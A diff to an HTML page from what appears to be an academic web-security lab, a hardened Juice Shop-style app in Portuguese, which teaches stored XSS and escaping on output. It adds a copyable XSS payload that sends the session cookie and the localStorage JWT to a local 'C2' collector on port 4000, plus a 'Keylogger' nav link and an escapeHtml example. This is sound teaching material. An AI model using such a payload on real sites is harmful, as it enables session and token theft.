@@ -18,6 +18,7 @@
         <a href="/search?q=">Busca</a>
         <a href="/reviews">Avaliações</a>
         <a href="/dom">DOM</a>
+        <a href="/keylog">Keylogger</a>
       </nav>
     </div>
   </header>
@@ -29,6 +30,15 @@
         <p>XSS Armazenado — conteúdo salvo com escape aplicado na renderização</p>
       </div>
       <span class="xss-type-badge">XSS ARMAZENADO</span>
+    </div>
+
+    <div class="payload-box">
+      <div class="payload-box-header">
+        <span class="payload-box-title">⚡ Payload de demonstração — cole no campo "Avaliação"</span>
+        <button type="button" class="btn-copy" data-target="payload-stored">Copiar</button>
+      </div>
+      <pre class="payload-code" id="payload-stored">&lt;img src=x onerror="fetch('http://localhost:4000/capture?type=stored&amp;data='+encodeURIComponent(document.cookie)+'&amp;jwt='+encodeURIComponent(localStorage.getItem('token')))"&gt;</pre>
+      <p class="payload-box-note">Rouba o cookie de sessão e o JWT do <code>localStorage</code> e envia ao C2 (:4000). Aqui na versão segura, o <code>escapeHtml</code> o neutraliza na renderização.</p>
     </div>
 
     <div class="form-card">
@@ -83,13 +93,21 @@
           <div class="defense-info">
             <strong>Escape na Renderização</strong>
             <span>Os dados são escapados no momento de construir o HTML, não na entrada — a abordagem correta para persistência.</span>
+            <pre class="code-block">function escapeHtml(str) {
+  return String(str)                    // ① garante que é texto
+    .replace(/&amp;/g, '&amp;amp;')             // ② troca  &amp;  por  &amp;amp;
+    .replace(/&lt;/g, '&amp;lt;')              // ③ troca  &lt;  por  &amp;lt;
+    .replace(/&gt;/g, '&amp;gt;')              // ④ troca  &gt;  por  &amp;gt;
+    .replace(/"/g, '&amp;quot;')            // ⑤ troca  "  por  &amp;quot;
+    .replace(/'/g, '&amp;#x27;');           // ⑥ troca  '  por  &amp;#x27;
+}</pre>
           </div>
         </div>
         <div class="defense-item">
           <span class="check">✅</span>
           <div class="defense-info">
-            <strong>Limite de Comprimento</strong>
-            <span>Nome: 80 chars, texto: 400 chars — reduz superfície de ataque e previne buffer overflow em strings.</span>
+            <strong>Validação de Comprimento no Servidor</strong>
+            <span>Nome: 80 chars, texto: 400 chars — aplicada no servidor (não só no frontend), reduz a superfície para payloads longos e evita abuso do armazenamento.</span>
           </div>
         </div>
         <div class="defense-item">
@@ -106,5 +124,7 @@
   <footer>
     <p>Projeto Acadêmico — Segurança de Sistemas &nbsp;|&nbsp; OWASP Juice Shop Seguro</p>
   </footer>
+
+  <script src="/copy.js"></script>
 </body>
 </html>
